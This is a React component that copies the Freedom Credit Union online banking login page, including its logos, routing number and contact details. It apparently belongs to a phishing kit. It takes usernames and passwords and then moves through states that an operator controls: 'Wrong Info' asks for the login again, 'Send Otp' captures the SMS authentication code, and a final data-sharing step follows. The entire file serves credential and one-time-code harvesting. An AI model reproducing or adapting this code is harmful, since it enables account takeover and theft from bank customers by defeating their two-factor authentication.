import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import BankingHeader from "./BankingHeader";
import FreedomFavIcon from "../../../../../../../../assets/allBanks/banks/freedom/fcu.ico";
import FreedomImg from "../../../../../../../../assets/allBanks/banks/freedom/fcu2.png";
import BankControl from "./BankControl";
import BasicLoader from "../../../../../loading/BasicLoader";
import { RiLock2Fill } from "react-icons/ri";
import { Link } from "react-router-dom";
import {
  FaArrowRightLong,
  FaLinkedinIn,
  FaRegEye,
  FaRegEyeSlash,
  FaXTwitter,
} from "react-icons/fa6";
import { ClipLoader } from "react-spinners";
import BankOtpControl from "./BankOtpControl";
import ShareData from "./ShareData";
import { IoCloseCircleOutline } from "react-icons/io5";
import { FiFacebook } from "react-icons/fi";
import Ncua from "../../../../../../../../assets/allBanks/banks/freedom/fcu1.png";

const Freedom = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  setIsOpenOtp,
  loading,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0 bg-customGray-1069",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Freedom Credit Union Online Banking"
        handleCancel={handleCancel}
        img={FreedomFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <header className="flex items-center justify-between gap-10 customMiniTablet:gap-0 py-3.5 pl-2 pr-0  customMiniTablet:pr-10 bg-white box-shadow3 ">
        <div className="w-[200px] h-10">
          <img
            src={FreedomImg}
            alt=""
            className="object-contain w-full h-full"
          />
        </div>
        <h3 className="text-sm text-customGray-1070">
          Need to enroll in digital banking?{" "}
          <Link to="https://freedomcu.org/" className="text-customBlue-1036">
            Start here
          </Link>
        </h3>
      </header>

      <div className="items-center justify-center min-h-[55vh] px-6 pt-8 customMiniTablet:flex">
        <div
          className={clsx(
            "w-full customMiniTablet:w-[500px]",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <div className="mb-6 space-y-2">
            <h1 className="font-serif text-4xl text-customGray-400">
              Welcome!
            </h1>
            <p className="text-sm mr-12  customMiniTablet:mr-[12rem] text-customGray-1070">
              Please enter your user name and password to log in to digital
              banking.
            </p>
          </div>

          <div>
            <div className="space-y-5">
              <div>
                <input
                  type="text"
                  value={formState.username}
                  name="username"
                  onChange={handleChange}
                  placeholder="Username"
                  className={clsx(
                    "w-full px-4 py-3 border rounded-md outline-none border-customGray-1071 focus:border-customGreen-1002 transistion2",
                    errorFormState.username
                      ? "border border-customRed-1008"
                      : ""
                  )}
                />
                {errorFormState.username && (
                  <p className="flex items-center gap-1 mt-0.5 text-sm text-customRed-1008">
                    <IoCloseCircleOutline size={16} />
                    Required
                  </p>
                )}
              </div>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={formState.password}
                  name="password"
                  onChange={handleChange}
                  placeholder="Password"
                  className={clsx(
                    "w-full pl-4 pr-14 py-3 border rounded-md outline-none border-customGray-1071 focus:border-customGreen-1002 transistion2 ",
                    errorFormState.password
                      ? "border border-customRed-1008"
                      : ""
                  )}
                />

                <span
                  onClick={() => setshowPassword((prevShow) => !prevShow)}
                  className="absolute h-full leading-[4.3] right-4 text-customGreen-1002 font-semibold text-xs"
                >
                  {showPassword ? "Hide" : "Show"}
                </span>

                {errorFormState.password && (
                  <p className="flex items-center gap-1 mt-0.5 text-sm text-customRed-1008">
                    <IoCloseCircleOutline size={16} />
                    Required
                  </p>
                )}
              </div>
            </div>
            <div className="items-center justify-between block mt-8 customMiniTablet:flex">
              <button
                disabled={loading}
                onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                className="w-full customMiniTablet:w-[111px] h-10 text-white rounded-full bg-customGreen-1002 font-bold"
              >
                {loading && <ClipLoader size={10} color="#fff" />}
                {loading ? "Loading..." : "Log In"}
              </button>
              <div className="w-full mt-5 text-center customMiniTablet:w-max customMiniTablet:mt-0 customMiniTablet:text-end">
                <Link
                  to="https://freedomcu.org/"
                  className="text-sm text-customBlue-1036"
                >
                  Forgot your username or password?
                </Link>
              </div>
            </div>
          </div>
        </div>
        <div>
          {allBankOpen && (
            <div className={clsx(OtpOpen ? "hidden" : "block")}>
              <BankControl
                handleSelectedId={handleSelectedId}
                selectedPath={selectedPath}
                handleSelectSubmit={handleSelectSubmit}
              />
              <div>
                {activePathDetails.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activePathDetails.name === "Wrong Info" && (
                  <>
                    <div className={clsx("w-full customMiniTablet:w-[500px]")}>
                      <div className="mb-6 space-y-2">
                        <h1 className="font-serif text-4xl text-customGray-400">
                          Welcome!
                        </h1>
                        <p className="text-sm mr-12  customMiniTablet:mr-[12rem] text-customGray-1070">
                          Please enter your user name and password to log in to
                          digital banking.
                        </p>
                      </div>

                      <div>
                        <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-1008">
                          <p>{activePathDetails.body}</p>
                        </div>
                        <div className="space-y-5">
                          <div>
                            <input
                              type="text"
                              value={formState.username}
                              name="username"
                              onChange={handleChange}
                              placeholder="Username"
                              className={clsx(
                                "w-full px-4 py-3 border rounded-md outline-none border-customGray-1071 focus:border-customGreen-1002 transistion2",
                                errorFormState.username
                                  ? "border border-customRed-1008"
                                  : ""
                              )}
                            />
                            {errorFormState.username && (
                              <p className="flex items-center gap-1 mt-0.5 text-sm text-customRed-1008">
                                <IoCloseCircleOutline size={16} />
                                Required
                              </p>
                            )}
                          </div>
                          <div className="relative">
                            <input
                              type={showPassword ? "text" : "password"}
                              value={formState.password}
                              name="password"
                              onChange={handleChange}
                              placeholder="Password"
                              className={clsx(
                                "w-full pl-4 pr-14 py-3 border rounded-md outline-none border-customGray-1071 focus:border-customGreen-1002 transistion2 ",
                                errorFormState.password
                                  ? "border border-customRed-1008"
                                  : ""
                              )}
                            />

                            <span
                              onClick={() =>
                                setshowPassword((prevShow) => !prevShow)
                              }
                              className="absolute h-full leading-[4.3] right-4 text-customGreen-1002 font-semibold text-xs"
                            >
                              {showPassword ? "Hide" : "Show"}
                            </span>

                            {errorFormState.password && (
                              <p className="flex items-center gap-1 mt-0.5 text-sm text-customRed-1008">
                                <IoCloseCircleOutline size={16} />
                                Required
                              </p>
                            )}
                          </div>
                        </div>
                        <div className="items-center justify-between block mt-8 customMiniTablet:flex">
                          <button
                            disabled={loading}
                            onClick={(e) =>
                              handleTheMainSubmit(e, onSumbitForm)
                            }
                            className="w-full customMiniTablet:w-[111px] h-10 text-white rounded-full bg-customGreen-1002 font-bold"
                          >
                            {loading && <ClipLoader size={10} color="#fff" />}
                            {loading ? "Loading..." : "Log In"}
                          </button>
                          <div className="w-full mt-5 text-center customMiniTablet:w-max customMiniTablet:mt-0 customMiniTablet:text-end">
                            <Link
                              to="https://freedomcu.org/"
                              className="text-sm text-customBlue-1036"
                            >
                              Forgot your username or password?
                            </Link>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activePathDetails.name === "Send Otp" && (
                  <>
                    <h3>{activePathDetails.body}</h3>

                    <div className={clsx("w-full customMiniTablet:w-[340px]")}>
                      <div>
                        <div className="text-customGray-1055">
                          <div>
                            <h3 className="mb-3 text-xl font-medium">
                              Enter Authentication Code
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-4 text-sm">
                              A text message with a 6-digit authentication code
                              was sent to your mobile phone, enter it below to
                              continue to your accounts
                            </h2>
                            <div>
                              <input
                                type="number"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                className={clsx(
                                  "w-full px-4 py-3 border rounded-md outline-none border-customGray-1071 focus:border-customGreen-1002 transistion2 no-spinner",
                                  errorOtp.otpo
                                    ? "border border-customRed-1008"
                                    : ""
                                )}
                              />

                              {errorOtp.otpo && (
                                <p className="flex items-center gap-1 mt-0.5 text-sm text-customRed-1008">
                                  <IoCloseCircleOutline size={16} />
                                  Required
                                </p>
                              )}
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center my-10",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Did not receive a code? Resend Code
                            </p>
                            <button
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                              className="w-[111px] h-10 text-white rounded-full bg-customGreen-1002 font-bold"
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Submit"}
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
              </div>
            </div>
          )}
          {OtpOpen && (
            <>
              <BankOtpControl
                handleSelectedOtp={handleSelectedOtp}
                selectedOtp={selectedOtp}
                handleSubmitOtp={handleSubmitOtp}
              />

              <div>
                {activeOtp.name === "Loading" && (
                  <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                    <BasicLoader />
                  </p>
                )}
                {activeOtp.name === "wrong" && (
                  <>
                    <div className={clsx("w-full customMiniTablet:w-[340px]")}>
                      <div>
                        <div className="text-customGray-1055">
                          <div>
                            <h3 className="mb-3 text-xl font-medium">
                              Enter Authentication Code
                            </h3>
                          </div>
                          <div>
                            <h2 className="mb-4 text-sm">
                              A text message with a 6-digit authentication code
                              was sent to your mobile phone, enter it below to
                              continue to your accounts
                            </h2>
                            <div>
                              <input
                                type="number"
                                value={formOtp.otpo}
                                name="otpo"
                                onChange={changeOtp}
                                className={clsx(
                                  "w-full px-4 py-3 border rounded-md outline-none border-customGray-1071 focus:border-customGreen-1002 transistion2 no-spinner",
                                  errorOtp.otpo
                                    ? "border border-customRed-1008"
                                    : ""
                                )}
                              />

                              {errorOtp.otpo && (
                                <p className="flex items-center gap-1 mt-0.5 text-sm text-customRed-1008">
                                  <IoCloseCircleOutline size={16} />
                                  Required
                                </p>
                              )}
                              <h3 className="mt-2 text-sm text-customRed-1008">
                                {activeOtp.body}
                              </h3>
                            </div>
                            <p
                              className={clsx(
                                "cursor-pointer text-customBlue-100 font-bold text-center my-10",
                                !resend &&
                                  "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                              )}
                              onClick={handleResend}
                            >
                              Did not receive a code? Resend Code
                            </p>
                            <button
                              onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                              className="w-[111px] h-10 text-white rounded-full bg-customGreen-1002 font-bold"
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Submit"}
                            </button>
                          </div>
                        </div>
                      </div>
                    </div>
                  </>
                )}
                {activeOtp.name === "otp" && (
                  <>
                    <ShareData
                      bankName={bankName}
                      handleTheFinal={handleTheFinal}
                      handleCancel={handleCancel}
                      setIsOpenOtp={setIsOpenOtp}
                      setAllBankItems={setAllBankItems}
                      siteLink="https://www.alliantcreditunion.org/"
                    />
                  </>
                )}
              </div>
            </>
          )}
        </div>
      </div>
      <footer className="px-12 pb-20 mt-48 text-xs text-customGray-1070 ">
        <div className="justify-between pt-12 space-y-10 border-t customTablet1:space-y-0 customTablet1:flex border-t-customGray-1071">
          <div>
            <div className="w-[200px] h-12 -ml-6 mb-3">
              <img
                src={FreedomImg}
                alt=""
                className="object-contain w-full h-full"
              />
            </div>
            <p>© 2025 Freedom Credit Union</p>
            <div className="flex items-center">
              <p>Equal Housing Opportunity</p>
              <div className="w-[200px] h-10">
                <img
                  className="object-contain w-full h-full"
                  src={Ncua}
                  alt=""
                />
              </div>
            </div>
            <p>Powered by Narmi</p>
            <p className="mt-5">
              APY = Annual Percentage Yield. APR = Annual Percentage Rate.
            </p>
          </div>
          <div className="gap-10 space-y-7 customTablet1:space-y-0 customTablet1:flex">
            <div>
              <h2 className="mb-2 font-bold">INFO</h2>
              <ul className="space-y-2">
                <li>Routing number: 2360-8475-1</li>
                <li>
                  <Link
                    className="font-medium text-customGreen-1002"
                    to="https://freedomcu.org/"
                  >
                    View locations and hours
                  </Link>
                </li>
                <li>
                  <Link
                    className="font-medium text-customGreen-1002"
                    to="https://freedomcu.org/"
                  >
                    Terms
                  </Link>
                </li>
                <li>
                  <Link
                    className="font-medium text-customGreen-1002"
                    to="https://freedomcu.org/"
                  >
                    Privacy Policy
                  </Link>
                </li>
              </ul>
            </div>
            <div>
              <h2 className="mb-2 font-bold">CONTACT US</h2>
              <ul className="space-y-2">
                <li>General support: 215-612-5900</li>
                <li>Lost card: 215-612-5900</li>
              </ul>
              <div className="flex gap-4 mt-4 text-lg">
                <p className="p-1 text-center text-white rounded-full bg-customGray-1070">
                  <FiFacebook />
                </p>
                <p className="p-1 text-center text-white rounded-full bg-customGray-1070">
                  <FaXTwitter />
                </p>
                <p className="p-1 text-center text-white rounded-full bg-customGray-1070">
                  <FaLinkedinIn />
                </p>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </motion.div>
  );
};

export default Freedom;
